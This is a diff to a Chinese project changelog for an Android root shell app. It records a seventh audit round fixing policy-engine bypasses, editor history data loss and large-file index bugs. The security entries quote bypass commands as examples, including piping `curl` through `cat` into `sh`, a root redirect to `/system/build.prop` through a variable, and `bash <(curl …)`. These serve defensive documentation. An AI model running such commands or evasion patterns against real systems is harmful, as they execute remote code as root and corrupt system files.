@@ -20,7 +20,7 @@
 |---|---|
 | 分支 | `main`，与 `origin/main` 同步 |
 | 许可 | **GPL-3.0-or-later**（2026-10-02 由 Apache-2.0 切换，强 Copyleft） |
-| 单元测试 | 441 tests / 0 failures / 1 skipped |
+| 单元测试 | 452 tests / 0 failures / 1 skipped |
 | lint | 0 errors / 31 warnings |
 | release 体积 | 2.18 MB，`verifyReleasePayload` 红线通过（≤2.2MB、无语法包、无 `tables/`） |
 | 终端 | 增量 ANSI/OSC 解析、单行渲染上限 4000 字符、一次性命令可中断/流式/保活 |
@@ -40,6 +40,86 @@
 ---
 
 ## 待办
+
+### A57. 第七轮全面 BUG 深挖（2026-10-02）
+
+前六轮已把 UI 层与执行引擎逐文件走完。A57 转攻**从未成组审过的决策层与数据层**
+（静态策略/脚本审计/权限探测，以及编辑器历史/文本统计/稀疏行索引/分块读取），
+并把前六轮明确推迟的最高危项落地。
+
+- [x] **两路审计**
+  - 数据层：`EditHistoryManager` / `TextStatistics` / `SparseLineIndex` / `ChunkedFileReader`
+  - 决策层：`ScriptAuditor` / `PolicyEngine` / `SecurityModels` / `FileItem` / `PermissionChecker`
+  - 两条链路的「前几轮报过但一直没修」的追问全部给出当前代码的确切结论
+    （历史迁移是否无条件删 legacy、字节数是否整份拷贝、索引失效面、
+    U+FFFD 是否当加密判据、管道是否只比相邻段、扩展名能否被双后缀绕过、root 探测有无去重）
+  - **结论：扩展名无法被绕过** —— `extension`/`realExtension` 都取最后一段，
+    `x.sh.txt`→不可执行、`x.apk.`→空、`X.APK`→仍可装，方向一律 fail-closed。
+    真实缺陷只是**三套口径分裂**（`x.sh.1` 在安装/预览可识别、在执行/字体不可识别），
+    A57 未定级为缺陷，留作后续口径收敛
+
+- [x] **安全性：静态层是远程执行的唯一防线（3 项 P0 + 1 项 fail-open）**
+  - [x] **重定向目标含变量时整条被丢弃 → root 覆写系统文件零 finding**。
+        `cat /dev/urandom > $T/build.prop`（`T=/system`）：walk 把 `>` 切成独立 token，
+        目标取下一个 token `$T/build.prop`，既非绝对路径**不被记录**、
+        又被从 `words` 里**消费掉** → `hasUnresolvedVar`（只扫 words）也看不到那个 `$`
+        → 整条 `Verdict.Allow`。真机实测守卫**没有 `cat`/`curl`/`sh` 包装器**，
+        两层防护同时失明。现新增 `Atom.unresolvedRedirects` 通道 + `REDIRECT_UNRESOLVED` 规则，
+        并把这些目标计入 `hasUnresolvedVar`
+  - [x] **管道只比较相邻段 → 中间插一个 `cat` 即绕过**。
+        `curl -fsSL url | cat | sh` 的两对相邻关系是 (curl→cat)、(cat→sh)：
+        第一对因 `next` 不是 shell 而跳过，第二对的上游只有 `cat`（既非下载器也非解码器）
+        → 零 finding，远程载荷以 root 执行。`tee`/`grep`/`nl`/`sed` 同理。
+        现回溯到**管道起点**取全部上游原子
+  - [x] **`REMOTE_PIPE_SHELL` 硬编码 DANGEROUS，与同函数 KDoc 承诺的 CRITICAL 相反**。
+        KDoc 明写「脚本文件里出现则说明作者刻意隐藏载荷 → CRITICAL，自动执行链路直接拦截」，
+        而 `ScriptAuditor` 只拦 CRITICAL → 档位 2/3 的「添加到 shso 后自动执行」
+        实测放行远程 root 代码。现统一走 `obfuscationLevel(source)`，与 `ENCODED_PIPE_SHELL` 对齐
+  - [x] 附带核实并**驳回**一条猜测：`bash <(curl …)` 的进程替换确实不可见，
+        但它与「重定向目标含变量」同源，已由上述 `unresolvedRedirects` 一并覆盖为 `DANGEROUS`；
+        未按 P0 定级（静态层不可能对该形态做 fail-closed 之外的更强判定，
+        且守卫仍无 `sh` 包装器可依赖，故如实记为 DANGEROUS 而非夸大）
+
+- [x] **数据丢失：编辑器历史（2 项 P0）**
+  - [x] **一次解析失败就抹掉该文件的全部历史**。`readFile` 把解析异常（含 `OutOfMemoryError`）
+        降级成 `emptyList()`，而 `addHistory` 随即 `HistoryMerge.apply(emptyList(), new)`
+        → `writeFile(单条)` **覆写同一 key**。触发现实：单 key 上限 100 万字，
+        `JSONArray(raw)` 需 3~5 倍瞬时内存，而编辑器已把 ≤32MB 文件载入内存；
+        空闲自动快照（默认常开、无开关）一次 OOM 即把 20 条历史全部抹掉且不可恢复。
+        现 `readFileOrNull` 区分「空」与「失败」，失败时**放弃本次写入**并把损坏原文另存备份
+  - [x] **迁移失败仍删 legacy → 升级即丢全部旧历史**。`remove(KEY_LEGACY)` 写在
+        `catch` **之外**的同一个 edit 块里：注释说「旧数据损坏直接丢弃」，实际照删不误。
+        现改为事务外先解析，失败则把 legacy 改名存为 `edit_history.unmigrated` 保留；
+        成功路径也补上单条 `MAX_CONTENT_CHARS` 截断与 `trimToBudget` 体积预算
+        （旧版无上限，20 条 × 数十万字会落成数 MB 单 key，反过来推高下一次 OOM 概率）
+
+- [x] **静默错误结果：大文件只读浏览（2 项 P0）**
+  - [x] **索引扫描失败仍返回「1 行的有效索引」→ 整个 >32MB 文件空白**。
+        root 通道单次读取失败（su 被拒/授权未确认/60s 超时且丢弃已读部分）让 `raw.isEmpty()`
+        直接 `break`，`count` 停在半路甚至为 0，而 `getOrNull()` 不抛异常 → 照样返回
+        `lines=1` 的索引；调用方随即 `chunkedLines = emptyList()` 把本来正确的首块行丢掉，
+        UI 变成 totalLines=1 的单行空白、`loadError` 为空、无任何提示 ——
+        用户以为文件是空的。现扫不全即返回 `null`，由上层用首块行兜底
+  - [x] **首块短读时整块被跳过 → 1024 行窗口整体错位**。
+        文件被外部截断后 `startOffset` 落在首块之外，`first.size <= skip` 时
+        `out` 为空、`newlines=0`，而游标仍从 `firstChunk+1` 起步 → 首个稀疏点覆盖的
+        1024 行累积区间整体前移，取到的是文件里更靠后的另一行，**行号看起来仍然正确**；
+        短读还会被当成完整块缓存，错位在整个 LRU 生命周期内不自愈。
+        现判为索引失效并返回空（由上层重建），且 `getChunk` 只缓存**满块**
+
+- [x] **回归**：452 tests / 0 failures / 1 skipped；lint 0 errors / 31 warnings；
+      `build_apk.py` 红线通过（2.2 MB）。新增 `PolicyBypassPathTest`（11 项）
+      锁死三条绕过路径，并**显式断言相对路径重定向与 fd 复制不得误报**
+      —— 第一版把 `> out.txt` 也判成不可知写点，被既有测试当场抓到后收紧为
+      「仅含变量/命令替换/进程替换才算不可知」
+- [x] **真机验证**
+  - 安装冷启动无崩溃；`FATAL=0`
+  - 实测守卫目录**无 `curl`/`sh`/`cat` 包装器**（调用返回 exit=127）
+    → 印证「静态层是远程管道唯一防线」，上述三项策略修复针对的正是唯一防线
+  - 审计日志中的 `GUARD_POLICY_MODE` 间隔疑似热循环，**核实为误报**：
+    那 4 条对应本会话刚做的四次横竖屏旋转（`remember` 随 Activity 重建重置），
+    停歇后无新增，不作为缺陷
+  - 探针文件已清理
 
 ### A56. 第六轮全面 BUG 深挖（2026-10-02）
 
